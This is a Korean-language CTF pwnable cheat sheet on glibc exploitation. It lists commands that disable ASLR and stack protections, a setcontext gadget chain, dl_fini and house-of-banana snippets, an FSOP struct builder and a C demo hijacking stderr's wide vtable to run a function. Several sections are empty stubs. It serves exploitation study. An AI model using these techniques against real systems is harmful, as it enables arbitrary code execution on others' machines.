# ✍️ PWNABLE CTF TIPS
> 참고할만한 pwnable 팁들을 기록

# Catalog
- [✍️ PWNABLE CTF TIPS](#️-pwnable-ctf-tips)
- [Catalog](#catalog)
- [Other](#other)
  - [Protect option](#protect-option)
  - [System api argument trick](#system-api-argument-trick)
  - [File descriptor trick](#file-descriptor-trick)
  - [Nx/dep Trick](#nxdep-trick)
  - [Calloc Trick](#calloc-trick)
  - [Ld.so dl\_fini trick](#ldso-dl_fini-trick)
  - [Leak stack address](#leak-stack-address)
  - [Malloc .tls mmap trick](#malloc-tls-mmap-trick)
  - [.tls cookie overwrite](#tls-cookie-overwrite)
  - [.tls pointer\_guard overwrite](#tls-pointer_guard-overwrite)
  - [tcache\_pthread\_structure overwrite](#tcache_pthread_structure-overwrite)
  - [\_\_mp overwrite](#__mp-overwrite)
  - [Useful Gadget](#useful-gadget)
    - [exit function gadget](#exit-function-gadget)
    - [setcontext+61 gadget](#setcontext61-gadget)
  - [Useful after glibc 2.35](#useful-after-glibc-235)
    - [libc GOT overwrite](#libc-got-overwrite)
    - [dl\_fini overwrite](#dl_fini-overwrite)
    - [house of banana](#house-of-banana)
    - [FSOP](#fsop)
      - [\_IO\_obstack\_overflow](#_io_obstack_overflow)
      - [house of apple](#house-of-apple)
      - [\_IO\_cookie\_write](#_io_cookie_write)
  - [Usefull tools](#usefull-tools)

# Other
- [pwntools](pwntools/pwntools.md)
- [how2heap](how2heap/how2heap.md)


## Protect option
```sh
sudo sysctl -w kernel.randomize_va_space = 0 # ASLR OFF
sudo sysctl -w kernel.randomize_va_sapce = 1 # ASLR STACK
sudo sysctl -w kernel.randomize_va_space = 2 # ASLR STACK/HEAP
```
```sh
gcc -o <executable> <source_code> -no-pie -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pic -z execstack # NO CANARY, NO PIE, NO PIC, NO NX/DEP
```

## System api argument trick
```sh
system("ed") # 대화형 쉘 만들기
```

## File descriptor trick
```c
dup2(4, 0); // stdin -> fd 4
dup2(4, 1); // stdout -> fd 4
dup2(4, 2); // stderr -> fd 4

위와 동일

0>&4
1>&4
2>&4
```

## Nx/dep Trick
```c
__stack_pivot = 7
eax = __libc_stack_end
dl_make_stack_executable()
```

## Calloc Trick
```
Don't zero out memory if the chunk's IS_MMAPPED bit is set
```

## Ld.so dl_fini trick
```sh
overwrite _rtld_global + 3840(dl_fini)
```

## Leak stack address
```
(char**)environ has a stack address
```

## Malloc .tls mmap trick
```c
malloc(0x21000) // mmaped .tls section which has stack addr, main_arena, canary, etc
```

## .tls cookie overwrite
## .tls pointer_guard overwrite
## tcache_pthread_structure overwrite
## __mp overwrite

## Useful Gadget
### exit function gadget
### setcontext+61 gadget
```
mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
```
위 가젯으로 `hook` 들을 변조하고, `rdx + 0x20`에 아래의 `setcontext+61` 가젯을 넣으면 rsp를 포함한 대부분의 레지스터 컨트롤이 가능하다.
```
   0x54f5d <setcontext+61>:     mov    rsp,QWORD PTR [rdx+0xa0]
   0x54f64 <setcontext+68>:     mov    rbx,QWORD PTR [rdx+0x80]
   0x54f6b <setcontext+75>:     mov    rbp,QWORD PTR [rdx+0x78]
   0x54f6f <setcontext+79>:     mov    r12,QWORD PTR [rdx+0x48]
   0x54f73 <setcontext+83>:     mov    r13,QWORD PTR [rdx+0x50]
   0x54f77 <setcontext+87>:     mov    r14,QWORD PTR [rdx+0x58]
   0x54f7b <setcontext+91>:     mov    r15,QWORD PTR [rdx+0x60]
   0x54f7f <setcontext+95>:     test   DWORD PTR fs:0x48,0x2
   0x54f8b <setcontext+107>:    je     0x55046 <setcontext+294>

   0x55046 <setcontext+294>:    mov    rcx,QWORD PTR [rdx+0xa8]
   0x5504d <setcontext+301>:    push   rcx
   0x5504e <setcontext+302>:    mov    rsi,QWORD PTR [rdx+0x70]
   0x55052 <setcontext+306>:    mov    rdi,QWORD PTR [rdx+0x68]
   0x55056 <setcontext+310>:    mov    rcx,QWORD PTR [rdx+0x98]
   0x5505d <setcontext+317>:    mov    r8,QWORD PTR [rdx+0x28]
   0x55061 <setcontext+321>:    mov    r9,QWORD PTR [rdx+0x30]
   0x55065 <setcontext+325>:    mov    rdx,QWORD PTR [rdx+0x88]
   0x5506c <setcontext+332>:    xor    eax,eax
   0x5506e <setcontext+334>:    ret
```
## Useful after glibc 2.35
### libc GOT overwrite

### dl_fini overwrite
- libc.so.6의 `run_exit_handlers` 함수에서 ld의 `dl_fini` 함수를 부름.
- `dl_fini` 함수에서 ld의 특정 위치에서 값을 가져와 호출하기 때문에, 이를 변조하면 쉘을 얻을 수 있다.
### house of banana
```py
banana = libc_base + 0x233000 + 0x3a000 + 0x12e0 + 0x1000*-7
log.info(hex(banana))
log.info(hex(encrypt(banana)))
add(1, 0xa0, b"\xff"*0x80+p64(0)+p64(0x31)+p64(encrypt(banana)))
add(3, 0x20, p64(encrypt(banana)))
add(4, 0x20, b"x")
add(5, 0x20, p64(banana+0x8-0x3d70) + p64(libc_base + 0xebcf1))
```
### FSOP
```py
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP
```
#### _IO_obstack_overflow
```c
struct _IO_obstack_file
{
  struct _IO_FILE_plus file;
  struct obstack *obstack;
};
```
```c
struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
				      chunk contains a zero-length object.  This
				      prevents freeing the chunk if we allocate
				      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
				     handler on error, but retained for binary
				     compatibility.  */
};
```
```c
/* the jump table.  */
const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =
{
    JUMP_INIT_DUMMY,
    JUMP_INIT(finish, NULL),
    JUMP_INIT(overflow, _IO_obstack_overflow),
    JUMP_INIT(underflow, NULL),
    JUMP_INIT(uflow, NULL),
    JUMP_INIT(pbackfail, NULL),
    JUMP_INIT(xsputn, _IO_obstack_xsputn),
    JUMP_INIT(xsgetn, NULL),
    JUMP_INIT(seekoff, NULL),
    JUMP_INIT(seekpos, NULL),
    JUMP_INIT(setbuf, NULL),
    JUMP_INIT(sync, NULL),
    JUMP_INIT(doallocate, NULL),
    JUMP_INIT(read, NULL),
    JUMP_INIT(write, NULL),
    JUMP_INIT(seek, NULL),
    JUMP_INIT(close, NULL),
    JUMP_INIT(stat, NULL),
    JUMP_INIT(showmanyc, NULL),
    JUMP_INIT(imbue, NULL)
};
```
- _IO_obstack_overflow
```c
obstack->next_free + 1 > obstack->chunk_limit
obstack->freefun = &system
obstack->extra_arg = &"/bin/sh"
obstack->use_extra_arg != 0
```
Finally Call `_IO_obstack_overflow`
#### house of apple
```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; // 劫持这个变量
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```
```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable; // 0xe0
};
```
`_IO_wide_data* _wide_data` 변수에 들어가는 구조체의 형태를 보면, `_wide_vtable`이 들어 있는데 해당 구조는 다음과 같다. 
```c
const struct _IO_jump_t _IO_wstrn_jumps libio_vtable attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t, _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```
최신 GLIBC에서, 해당 vtable에 대해서는 검사를 하지 않기 때문에 `vtable 영역`에 해당 주소가 존재하지 않아도 된다. 이를 통해 control flow를 조작한다.

- IO_wdefault_xsgetn
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);

    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x84420;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);

    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

    size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
 
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: change stderr->_flags to 0x800");
    *(size_t *)stderr2 = 0x800;

    puts("[+] step 2: change stderr->_mode to 1");
    *(size_t *)(stderr2 + 0xc0) = 1;
 
    puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
    *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;
 
    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;
 
    puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;

    puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
    *(size_t *)(p1 + 0x20) = (size_t)1;

    puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);

    puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);

}
```
> mode를 1로 설정해야 하기 때문에 효용성이 낮음

- _IO_wfile_overflow
```c
flags & ~ (0x2 | 0x8 | 0x800)
_wide_data->_IO_write_base == 0
_wide_data->_IO_buf_base == 0
```
> very good

- _IO_wfile_underflow_mmap
- 
#### _IO_cookie_write

## Usefull tools
- gdb-peda
- peda-heap
- pwngdb
- z3
- pwntools
- one_gadget
- ROPGadget
- libc_database